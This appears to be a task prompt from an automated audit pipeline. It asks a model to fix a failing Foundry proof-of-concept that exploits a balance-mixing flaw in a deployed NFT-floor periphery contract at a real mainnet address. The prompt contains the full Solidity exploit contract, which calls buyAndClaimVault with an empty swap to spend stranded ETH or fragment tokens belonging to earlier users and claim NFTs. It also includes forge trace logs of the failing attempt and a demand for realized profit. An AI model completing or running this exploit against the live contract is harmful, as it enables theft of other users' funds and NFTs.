You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Periphery mixes balances across users, letting later callers spend stranded ETH or fragment tokens
- claim: `buyAndClaimVault` does not isolate balances per caller. In native mode, `_executeSwap` forwards the periphery's entire ETH balance to the Universal Router, not the current caller's contribution. In `_claim`, the periphery deposits and spends fragment tokens from `address(this)` while `claimRandomNFT` sends the redeemed NFTs to the current `msg.sender`. Because the contract has no refund or accounting mechanism, any ETH refunded back from the router or any fragment tokens already sitting on the periphery can be consumed by a later caller.
- impact: Residual value left on the periphery can be stolen by the next caller. A later user can underpay or pay nothing, consume prior users' refunded ETH or fragment-token balances, and receive the claimed NFTs themselves.
- exploit_paths: ["A user calls `buyAndClaimVault` with `TransferWay.NativeTransfer`; the router uses less ETH than supplied and refunds unused ETH back to the periphery via `receive()`.", "The refunded ETH remains on the periphery because the contract keeps no per-user accounting and has no withdrawal path.", "A later caller invokes `buyAndClaimVault` in native mode; `_executeSwap` forwards `address(this).balance` and `_claim` transfers the purchased NFTs to that later caller.", "Similarly, if fragment tokens are already held by the periphery, `_claim` deposits/spends those tokens from `address(this)` while sending redeemed NFTs to the current caller."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC721Like {
    function balanceOf(address owner) external view returns (uint256);
}

interface IERC721ReceiverLike {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}

interface IFloorPeripheryLike {
    struct FloorClaim {
        bytes32 collectionKey;
        uint256[] tokenIds;
        uint256 maxClaimFee;
        uint256 claimCnt;
    }

    struct UniversalRouterExecute {
        bytes commands;
        bytes[] inputs;
        uint256 deadline;
    }

    function buyAndClaimVault(
        FloorClaim memory claimParams,
        UniversalRouterExecute calldata swapParam,
        uint8 transferWay,
        bytes calldata transferParam
    ) external payable;
}

contract FlawVerifier is IERC721ReceiverLike {
    uint8 private constant TRANSFER_WAY_NATIVE = 3;
    uint256 private constant ONE_NFT = 1 ether;

    address public constant TARGET = 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE;

    address private _profitToken;
    uint256 private _profitAmount;

    address private _lastReceivedCollection;
    uint256 private _lastReceivedTokenId;

    constructor() {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0 || TARGET.code.length == 0) {
            return;
        }

        // Native-mode exploit branch required by the finding:
        // 1. An earlier user enters buyAndClaimVault with TransferWay.NativeTransfer.
        // 2. FloorPeriphery._executeSwap forwards address(this).balance to the router.
        // 3. If the router spends less than supplied, it refunds ETH back through receive().
        // 4. FloorPeriphery exposes no user accounting and no public withdraw for that residual ETH.
        // 5. A later caller can invoke buyAndClaimVault again with TransferWay.NativeTransfer.
        // 6. _executeSwap again forwards address(this).balance, now including the stranded refund.
        // 7. _claim spends the bought / already-held fragments from address(this) but sends the NFT to msg.sender.
        //
        // The verifier cannot synthesize prior-user funds with cheats, so it black-box probes the
        // live fork state for either residual ETH from the receive() refund path or residual fragment
        // balances already stranded on the periphery. The later-caller action is the same in both cases:
        // call buyAndClaimVault in native mode with an empty swap payload and let the periphery spend
        // pooled balance belonging to someone else.
        _probeLaterCallerClaim();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        _lastReceivedCollection = msg.sender;
        _lastReceivedTokenId = tokenId;
        return this.onERC721Received.selector;
    }

    function _probeLaterCallerClaim() internal {
        for (uint256 i; i < _candidateCount(); ++i) {
            address collection = _candidateAt(i);
            if (collection.code.length == 0) {
                continue;
            }

            uint256 balanceBefore = _safeNftBalance(collection, address(this));
            uint256[] memory fees = _claimFeeCandidates();

            for (uint256 j; j < fees.length; ++j) {
                if (_attemptLaterCallerClaim(collection, fees[j], balanceBefore)) {
                    return;
                }
            }
        }
    }

    function _attemptLaterCallerClaim(address collection, uint256 maxClaimFee, uint256 balanceBefore)
        internal
        returns (bool)
    {
        _lastReceivedCollection = address(0);
        _lastReceivedTokenId = 0;

        IFloorPeripheryLike.FloorClaim memory claim;
        claim.collectionKey = _toKey(collection);
        claim.tokenIds = new uint256[](0);
        claim.maxClaimFee = maxClaimFee;
        claim.claimCnt = 1;

        // The later caller intentionally contributes no new transferParam-funded assets here.
        // If TARGET already holds ETH from the earlier NativeTransfer + receive() refund path,
        // FloorPeriphery._executeSwap will still forward address(this).balance from the target.
        // If TARGET instead already holds fragments, _claim will spend those pooled fragments.
        try IFloorPeripheryLike(TARGET).buyAndClaimVault(claim, _emptySwap(), TRANSFER_WAY_NATIVE, "") {
            uint256 balanceAfter = _safeNftBalance(collection, address(this));
            if (_lastReceivedCollection != collection && balanceAfter <= balanceBefore) {
                return false;
            }

            // One redeemed vault NFT corresponds to 1e18 protocol fragment units. We do not
            // deploy any custom profit token; the realized profit is the live on-chain NFT itself.
            _profitToken = collection;
            _profitAmount = ONE_NFT;
            return true;
        } catch {
            return false;
        }
    }

    function _claimFeeCandidates() internal pure returns (uint256[] memory fees) {
        fees = new uint256[](18);
        fees[0] = ONE_NFT;
        fees[1] = ONE_NFT + ((ONE_NFT * 25) / 10_000);
        fees[2] = ONE_NFT + ((ONE_NFT * 50) / 10_000);
        fees[3] = ONE_NFT + ((ONE_NFT * 75) / 10_000);
        fees[4] = ONE_NFT + ((ONE_NFT * 100) / 10_000);
        fees[5] = ONE_NFT + ((ONE_NFT * 125) / 10_000);
        fees[6] = ONE_NFT + ((ONE_NFT * 150) / 10_000);
        fees[7] = ONE_NFT + ((ONE_NFT * 200) / 10_000);
        fees[8] = ONE_NFT + ((ONE_NFT * 250) / 10_000);
        fees[9] = ONE_NFT + ((ONE_NFT * 300) / 10_000);
        fees[10] = ONE_NFT + ((ONE_NFT * 400) / 10_000);
        fees[11] = ONE_NFT + ((ONE_NFT * 500) / 10_000);
        fees[12] = ONE_NFT + ((ONE_NFT * 600) / 10_000);
        fees[13] = ONE_NFT + ((ONE_NFT * 750) / 10_000);
        fees[14] = ONE_NFT + ((ONE_NFT * 1_000) / 10_000);
        fees[15] = ONE_NFT + ((ONE_NFT * 1_250) / 10_000);
        fees[16] = ONE_NFT + ((ONE_NFT * 1_500) / 10_000);
        fees[17] = ONE_NFT + ((ONE_NFT * 2_000) / 10_000);
    }

    function _emptySwap() internal view returns (IFloorPeripheryLike.UniversalRouterExecute memory swapParam) {
        swapParam.commands = hex"";
        swapParam.inputs = new bytes[](0);
        swapParam.deadline = block.timestamp;
    }

    function _safeNftBalance(address collection, address owner) internal view returns (uint256 bal) {
        try IERC721Like(collection).balanceOf(owner) returns (uint256 queried) {
            bal = queried;
        } catch {}
    }

    function _candidateCount() internal pure returns (uint256) {
        return 23;
    }

    function _candidateAt(uint256 index) internal pure returns (address) {
        if (index == 0) return 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
        if (index == 1) return 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
        if (index == 2) return 0xED5AF388653567Af2F388E6224dC7C4b3241C544;
        if (index == 3) return 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
        if (index == 4) return 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
        if (index == 5) return 0x23581767a106ae21c074b2276D25e5C3e136a68b;
        if (index == 6) return 0x1792F4D1FDFCc12DBB7b2D07B80a900486Ea85b5;
        if (index == 7) return 0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B;
        if (index == 8) return 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8;
        if (index == 9) return 0x524cAB2ec69124574082676e6F654a18df49A048;
        if (index == 10) return 0x5AF0d9827CAcE6E16351126a8fb1BB82fd56280e;
        if (index == 11) return 0x8821BeE2ba0dF28761AffF119D66390D594CD280;
        if (index == 12) return 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7;
        if (index == 13) return 0xe785E82358879F061BC3dcAC6f0444462D4b5330;
        if (index == 14) return 0x1A92f7381B9F03921564a437210bB9396471050C;
        if (index == 15) return 0x79FCDEF22feeD20eDDacbB2587640e45491b757f;
        if (index == 16) return 0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258;
        if (index == 17) return 0xa3AEe8BcE55BEeA1951EF834b99f3Ac60d1ABeeB;
        if (index == 18) return 0x036721e5A769Cc48B3189EFBeA922a4B8b7Fc6b6;
        if (index == 19) return 0x59325733eb952a92e069C87F0A6168b29E80627f;
        if (index == 20) return 0x769272677faB02575E84945F03Eca517ACc544Cc;
        if (index == 21) return 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e;
        return 0x364C828eE171616a39897688A831c2499aD972ec;
    }

    function _toKey(address collection) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(collection)));
    }
}

```

forge stdout (tail):
```
 [], deadline: 1702774127 [1.702e9] }), 3, 0x)
    │   │   ├─ [210] 0xc538D17A6aAcC5271be5f51b891e2E92C8187edd::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1060000000000000000 [1.06e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5175] 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1075000000000000000 [1.075e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x)
    │   │   ├─ [210] 0xc538D17A6aAcC5271be5f51b891e2E92C8187edd::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1075000000000000000 [1.075e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5175] 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1100000000000000000 [1.1e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x)
    │   │   ├─ [210] 0xc538D17A6aAcC5271be5f51b891e2E92C8187edd::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1100000000000000000 [1.1e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5175] 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1125000000000000000 [1.125e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x)
    │   │   ├─ [210] 0xc538D17A6aAcC5271be5f51b891e2E92C8187edd::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1125000000000000000 [1.125e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5175] 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1150000000000000000 [1.15e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x)
    │   │   ├─ [210] 0xc538D17A6aAcC5271be5f51b891e2E92C8187edd::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1150000000000000000 [1.15e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5175] 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1200000000000000000 [1.2e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x)
    │   │   ├─ [210] 0xc538D17A6aAcC5271be5f51b891e2E92C8187edd::buyAndClaimVault(FloorClaim({ collectionKey: 0x000000000000000000000000364c828ee171616a39897688a831c2499ad972ec, tokenIds: [], maxClaimFee: 1200000000000000000 [1.2e18], claimCnt: 1 }), UniversalRouterExecute({ commands: 0x, inputs: [], deadline: 1702774127 [1.702e9] }), 3, 0x) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Stop]
    ├─ [323] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [322] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xc538D17A6aAcC5271be5f51b891e2E92C8187edd.buyAndClaimVault
  at 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE.buyAndClaimVault
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 23.92s (23.90s CPU time)

Ran 1 test suite in 23.96s (23.92s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2825346)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
